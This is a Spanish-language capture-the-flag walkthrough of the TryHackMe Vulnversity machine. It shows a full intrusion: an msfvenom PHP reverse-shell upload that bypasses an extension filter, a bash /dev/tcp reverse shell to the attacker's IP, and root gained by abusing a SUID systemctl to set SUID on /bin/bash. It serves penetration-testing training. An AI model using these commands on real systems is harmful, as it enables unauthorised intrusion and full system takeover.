# Escalada de Privilegios en Linux – Binarios SUID

Maquinas que vamos a utilizar **Kali Linux y Vulnversity** [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

Otra técnica muy frecuente para escalar privilegios en Linux es la enumeración de binarios SUID, donde podremos conocer que binarios tienen **setuid 0** y podemos utilizarlos para escalar privilegios en Linux.

<aside>
💡

El **setuid** (Set User ID) es un permiso especial en sistemas operativos basados en Unix que permite a los usuarios ejecutar un archivo con los privilegios del propietario del archivo, en lugar de con los suyos propios. Esto es útil para tareas que requieren permisos elevados, como cambiar contraseñas o enviar paquetes de red.

Cuando un archivo tiene **setuid 0**, significa que se ejecutará con los privilegios del usuario **root** (ID 0), lo que le otorga acceso total al sistema.

</aside>

```bash
ping -c 1 10.10.211.221
```

![image.png](./imagenes/image%2043.png)

<aside>
💡

Vamos a hacer la intrusión a esta maquina que ya la habíamos visto antes y después haremos la escalada de privilegios.

</aside>

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.10.211.221
```

![image.png](./imagenes/image%2044.png)

- Miramos en el navegador
    
    ![image.png](./imagenes/image%2045.png)
    

- Hacemos **Fuzzing Web con gobuster.**
    
    ```bash
    gobuster dir -u [http://10.10.211.221:3333/](./imagenes/http://10.10.211.221:3333/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![image.png](./imagenes/image%2046.png)
    

- Lo miramos en el navegador web y vemos que tenemos un panel de subida de archivos.
    
    `http://10.10.211.221:3333/internal/index.php`
    
    ![image.png](./imagenes/image%2047.png)
    

- Nos creamos un payload con msfvenom
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > pwned.php 
    ```
    
    ![image.png](./imagenes/image%2048.png)
    

- Como la extensión php no esta permitida en este panel le vamos a cambiar la extensión.
    
    ```bash
    mv pwned.php pwned.phtml
    ```
    
    ![image.png](./imagenes/image%2049.png)
    

- Lo intentamos subirlo
    
    ![image.png](./imagenes/image%2050.png)
    

- Volvemos a hacer  **Fuzzing Web** pero esta vez de [`http://10.10.211.221:3333/internal/`](./imagenes/http://10.10.211.221:3333/internal/) para encontrar la carpeta donde se guardan los archivos subidos.
    
    ```bash
    gobuster dir -u http://10.10.211.221:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![image.png](./imagenes/image%2051.png)
    

- Lo miramos en el navegador web.
    
    ![image.png](./imagenes/image%2052.png)
    
- Nos ponemos a la escucha con netcat por el puerto 443.
    
    ```bash
    nc -nlvp 443
    ```
    
    ![image.png](./imagenes/image%2053.png)
    

<aside>
👉

Como es una conexión por msfvenom y es muy inestable vamos a a estabilizarla.

</aside>

- Nos ponemos a la escucha con netcat por el puerto 444 en otra terminal
    
    ```bash
    nc -nlvp 444 
    ```
    
    ![image.png](./imagenes/image%2054.png)
    

- Nos vamos a la pagina [https://www.revshells.com/](./imagenes/https://www.revshells.com/) y creamos y copiamos el código de una reverse shell.
    
    ![image.png](./imagenes/image%2055.png)
    

Que quedaría así : 

`bash -c "sh -i >& /dev/tcp/10.21.166.149/444 0>&1"`

- ejecutamos el archivo malicioso y cuando tengamos la conexión pegamos el código para generar una conexión estable por el puerto 444.
    
    ![image.png](./imagenes/image%2056.png)
    

![image.png](./imagenes/image%2057.png)

---

**Comenzamos con la escalada de privilegios**

![image.png](./imagenes/image%2058.png)

- Ejecuto el comando **sudo -l**
    
    `sudo -l`
    
    ![image.png](./imagenes/image%2059.png)
    
    😲😲 No funciona 😲
    

- Vamos a hacer la siguiente búsqueda para buscar binarios vulnerable (con el permiso de root dentro del sistema. y Lugo comprobaremos en la web [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/) si alguno de esos vinarios nos puede servir.
    
    `find / -perm -4000 2>/dev/null`
    
    ![image.png](./imagenes/image%2060.png)
    

- Vamos a probar por ejemplo el binario **chfn**
    
    ![image.png](./imagenes/image%2061.png)
    
    Vemos que no aparece.
    
- Probamos con **systemctl**
    
    ![image.png](./imagenes/image%2062.png)
    

Lo que estamos haciendo básicamente ahora es **SUID** por lo tanto buscamos la instrucciones para el.

![image.png](./imagenes/image%2063.png)

- Pero primero vamos a hacer un tratamiento de la TTY
    
    `script /dev/null -c bash`
    
    `CTRL+Z`
    
    `stty raw -echo; fg`
    
    `reset xterm`  : 
    
    **NOTA:** En ocasiones cuanto escribimos **reset xterm** no aparece en la pantalla pero se esta escribiendo.
    
    ![image.png](./imagenes/image%2064.png)
    

`export TERM=xterm`
`export SHELL=bash`

- Nos ubicamos en el directorio “/**tmp**” y nos creamos un script en bash con el contenido que hemos encontrado en [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/).
    
    `cd /tmp`
    
    `nano [escalada.sh](./imagenes/http://escalada.sh/)`
    
    ![image.png](./imagenes/image%2065.png)
    
    ![image.png](./imagenes/image%2066.png)
    
    ![image.png](./imagenes/image%2067.png)
    
     Modificamos esto: `"id > /tmp/output"` →  `"chmod u+s /bin/bash"`
    
    <aside>
    💡
    
    Cada elemento del comando cumple una función específica:
    
    🔹 **`chmod`** → Es el comando que se usa para **cambiar los permisos** de archivos en Linux.
    
    🔹 **`u+s`** → Se divide en dos partes:
    
    - **`u`** → Representa el **usuario propietario** del archivo (normalmente root).
    - **`+s`** → Habilita el **bit SUID (Set User ID)**, lo que permite que el programa se ejecute con los privilegios de su propietario en lugar de los del usuario que lo ejecuta.
    🔹 **`/bin/bash`** → Es el archivo al que se le aplican los nuevos permisos. En este caso, el ejecutable de **Bash**, la shell de comandos de Linux.
    - 
    
    Esto significa que **podría ejecutar comandos con privilegios de administrador**, lo que puede ser un grave **riesgo de seguridad**.
    
    </aside>
    
- Ejecutamos el archivo que acabamos de crear.
    
    `bash [escalada.sh](./imagenes/http://escalada.sh/)`
    
    ![image.png](./imagenes/image%2068.png)
    
    😲😲**Me da un error** 😱
    

El error es que en el archivo **esta puesta la ruta relativa** y dentro de lo posible siempre hay que evitar esto y **poner la ruta absoluta**.

![image.png](./imagenes/image%2069.png)

La ruta la encontrábamos aquí anteriormente. `/bin/systemctl`

![image.png](./imagenes/image%2070.png)

**Quedando asi:**

![image.png](./imagenes/image%2071.png)

- Volvemos a ejecutar el archivo que habíamos creado.
    
    `bash [escalada.sh](./imagenes/http://escalada.sh/)`
    
    ![image.png](./imagenes/image%2072.png)
    

- Escribimos el siguiente comando y nos habremos convertimos en **root**.
    
    `bash -p`
    
    ![image.png](./imagenes/image%2073.png)